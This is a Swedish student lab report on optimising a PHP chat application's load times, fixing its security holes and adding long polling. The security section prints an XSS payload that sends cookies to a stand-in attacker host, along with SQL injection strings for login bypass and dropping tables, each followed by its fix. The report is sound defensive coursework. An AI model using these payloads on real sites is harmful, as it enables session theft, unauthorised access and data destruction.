Rapport för laboration 2 - 1DV449
Av: Viktor Nilsson

### Laddningstid ###

Det fanns en hel del att göra för att optimera laddningstiden för sidan och dessa samt tiderna efter att förändringarna gjorts visas här nedan.
Då det främst var inloggningen som tog tid gjordes flest tester här. Applikationen har under dessa tester körs från binero.

Tider för inloggningen i sekunder.
<pre>
Gjort åtgärd:           1      2      3      4      5     6     7

Första gången: 7050 - 3640 - 6500 - 6320 - 3080 - 3710 - 913 - 1070
Andra gången:  5860 - 2620 - 2230 - 2600 - 2760 -  586 - 112 -  647
Tredje gången: 4270 - 2250 - 2020 - 3100 - 3030 -  424 - 367 -  496
</pre>

 Åtgärder
 1. Ta bort onödig location (img/middle.php) + delayen på 2 sec
 2. Ta bort script som inte finns (longpoll.js) - onödig + mindre GET, boken
 3. Flytta om så att check.php körs i mess.php för att slippa ännu fler GET, boken
 4. Samla inline-script och css i mess.php och köra med externa filer (othercss.css, otherscripts.js)
 5. Tar bort dynamiska cssfilerna från css.php och lagt i othercss.css statiska filer. Kortare laddningstider pga lokal, färre GET, boken
 6. Minska bilderna - mindre data att skicka => snabbare (food.jpg)
 7. Minimera storleken på css- och js-filer.
 
 ### Mer om åtgärderna ###
 
 1. Genom att ta bort GET-requests drar vi ner på laddningstiden så location's vill vi minimera. Sen tog jag även bort fulingen som gjorde att applikationen tog 2 sekunder extra att laddas. Som källa till denna åtgärd tar jag både boken och föreläsningarna då vi pratat mycket om att dra ner på antalet förfrågningar. Laddningstiden blev markant bättre främst på grund av de 2 sekunderna som applikationen pausade.
 2. Scriptet fanns ej och såg därför ingen anledning till att ha det med. Detta drog ner på ytterligare en GET-request även fast det nog inte gjorde speciellt mycket är det en av de små bäckarna. Laddningstiden blev konstig första gången men andra och tredje visar ändå på förbättring, frågan är dock om det gjorde så pass mycket som den visar. Samma referens som ovan.
 3. För att fortsätta dra ner på onödiga laddningar omstrukturerade jag lite och flyttade över funktionalitet från check.php till mess.php. Här ser vi att laddningstiden hoppar upp förmodligen på grund av andra faktorer.
 4. Jag behöll inline-cssen för index.php då den förmodligen bara kommer köras en gång per session, men inline script och css i mess.php samlade jag ihop till var sin extern fil (othercss.css & otherscripts.js) för att kunna cachea detta så att det går snabbare att ladda sidan senare. Även omstrukturering gjordes i ordningen saker och ting laddades. Längst upp laddas css och längst ner script. css ska laddas först för att sidan ska kunna renderas snyggt och snabbt, script sist för att dessa inte behövs förrän sidan renderats och att dom enbart laddas hem en och en. (Boken som referens, Rule 6). Här ser vi vid första laddningen en markant skillnad. Det kan vara att bilden var cachead som spökade här.
 5. Jag vet inte om man fick göra så här, men vad jag kunde se från innehållet på de dynamiskt laddade css-filerna grid1 & grid2 fanns där inget som var specifikt för delar av sidan så jag valde att spara dessa lokalt istället för att snabba upp tiden. (Antar att det låg någon sleep() i denna också). Dessa tog över 1 sekund att ladda så skulle ge en markant skillnad hade jag hoppats på och det gav det förutom första laddningen som visar helt andra siffror.
 6. En sak jag märkte var att food.jpg var enormt stor och då den inte visades större än ungefär 300x220 behövde den heller inte vara större då den inte någonstans i applikationen visades större än detta. Här hade jag när jag gjort skrapan ändra storleken på skrapade bilder i php och sparat ner dessa i rätt storlek för att dra ner på datamängen som ska över till klienten. Här ser vi en stor skillnad då bilden emellanåt tog upp till 2-3 sekunder att ladda ibland.
 7. Som sista grej valde jag att förminska storleken på alla externa resurser (css och js) genom en minifier (http://cssminifier.com/ och http://javascript-minifier.com/). Allt för att dra ner på mängen data som ska skickas över. Testerna här visar att resultaten i förra testet kanske inte var helt så bra som dom visade då tiderna gick upp trots att jag förväntade mig dom att gå ner på grund av datamängen minskats med över 20-30% totalt på de externa resursfilerna.
 
 Kommentarer:
 css.php?css=grid1/2 tar väldigt ojämnt med tid under första testerna vilket gjort vissa tider ej rättvisa.
 den stora bilden food.jpg laddas inte alltid trots att cache rensas vilket har ställt till det i vissa testresultat.
 
 
 
 
### Säkerhet ###

1. Det fanns gott om säkerhetshål i applikationen varav ett var XSS i meddelandefältet.
-Man skulle kunna med hjälp av följande rad kunna skicka iväg cookieinformation till en extern sida: <script language="JavaScript">document.location="http://minhaxx0rsida.se/sparacookie.php?cookie=" + document.cookie;document.location="http://www.tillbakatillsidan.com"</script>
-Jag fixade till detta genom att köra htmlentities på all data som ska ut.
-Skada som hade kunnat ske är att någon får tag på ens session och kan komma in på sidan inloggad som dig.

2. Det finns inget skydd mot att highjacka sessioner.
-Man kan om man kommer åt sessionsinformationen (t.ex med en XSS-attack) använda denna för att logga in på sidan.
-Jag fixade detta genom att spara undan både IP och useragent som man sedan kollar mot. Går att manipulera men då måste attackeraren veta båda IP och useragent.
-Skadan som hade kunnat ske är samma som ovan; någon kan komma in på sidan inloggad som dig.

3. Mycket hål för SQL-Injections i ajaxanropen. Det jag upptäckt är getMessage, getMessageIdForProducer, getProducer går att utnyttja för SQL-injections.
-Genom att mata in ' OR '1'='1 Kommer allt att hämtas hem. Vill man kan man även '; DROP TABLE tabellen;--
-Fixas genom antingen att kolla så att ett ID är ett tal, intval() brukar jag använda för nummer. Att köra en prepare() och sen en bindParam() är vad jag gjort i detta fallet på samtliga.
-Med en SQL-Injection skulle man kunna komma över information från databasen eller förstöra genom att ta bort och manipulera data. Är lösenorden dåligt krypterade skulle dessa kunna användas för att testa dina inloggningsuppgifter på andra tjänster.

4. Det gick att logga in med SQL-injections i inloggningsfältet.
-Genom att mata in ' OR '1'='1 i båda fälten kommer du loggas in, inte otänkbart med adminkonto då detta ofta registreras först. Vet du användarnamnet kan du skriva in det och sedan skriva ' OR '1'='1 i lösenordsfältet för att logga in som den personen.
-Fixas som ovan genom att köra prepare() och bindParam().
-Går att göra saker som ovan men även att logga in som andra.

5. Mer SQL-injections finns att genomföra i meddelandeformuläret, både som namn och meddelande. Detta är precis som ovan avhjälpt med prepare() och bindParam() och innefattar samma säkerhetsrisker som ovan.

6. En säkerhetsrisk som var enkelt att missa var att vid utloggning blev man inte utloggad utan bara skickad till inloggningssidan. Gick man tillbaka var man fortfarande inloggad. Jag lade till en funktion som gjorde att man loggades ut innan man skickades tillbaka till index.php.
-Risken är att någon annan sätter sig vid datorn och kan komma åt ditt konto då du inte loggats ut på riktigt.
-Ta bort sessions hjälper i detta fallet för att döda inloggningen.
-Förbrytaren kan göra allt du kan då den är inloggad som dig.

### Comet Long Polling ###

Spännande extrauppgift som var riktigt lärorik! Jag löste uppgiften genom att ha en php-fil som efter att den kallas lägger sig i en loop i bestämt antal sekunder och kollar frekvent mot databasen om ett meddelande med ett nyare ID än det som skickades till scriptet finns. Om inte fortsätter loopandet, om det däremot kommit ett meddelande som är nyare och överensstämmer med producer-idet ($pid) retureras detta.

På klientsidan har jag tagit bort den vanliga koden som läste in meddelandena och ersatte med min egna som helt enkelt börjar med att kika om det finns något meddelande för $pid'en som är större än vilket det kommer finnas om det finns meddelanden. Detta äldsta meddelande skickas tillbaka och skrivs ut, samma kod excekveras igen fast denna gången med det nya idet för meddelandet. Hittas ett meddelande som är nyare händer samma sak och detta pågår till dess att det inte finns några nyare meddelande än sist laddat meddelande. Då kommer den istället ligga och försöka ladda scriptet tills dess att den timeoutar. Då tar den upp en ny anslutning och ligger och väntar innan antingen den också timeoutar eller att det faktiskt kommer ett nytt meddelande.

Den stora nackdelen är de väldigt många SQL-anrop som sker. Allt för att användaren ska få en push-aktig upplevelse. PHP är heller inte gjort för att ha denna typ av öppna anslutningar och vad jag kunnat läsa mig till så är detta väldigt resurskrävande med öppna anslutningar och php.

Jag lade även til en kolumn i sqlite-databasen (timestamp som integer) som håller tiden. Med javascript omvandlar jag denna och spottar ut mig ett finare format.
.prepend användes istället för .append för att få meddelandena att hamna i rätt ordning (senast överst).

### Slutkommentarer: ###
Ingen energi alls har lagts på att strukturera upp koden snyggare och med enhetligt. Hade jag haft tid hade jag gärna försökt ge mig på och göra denna kod mer objektorienterad och MVC men tid har inte funnits.
Inte heller har jag brytt mig om att kapsla in javascriptsfunktioner och den globala variabeln på ett snyggare sätt som vi lärde oss i webbteknik 1, också detta för att prioritera de moment laborationen var till för.
Hade jag haft mer tid hade detta också fixats.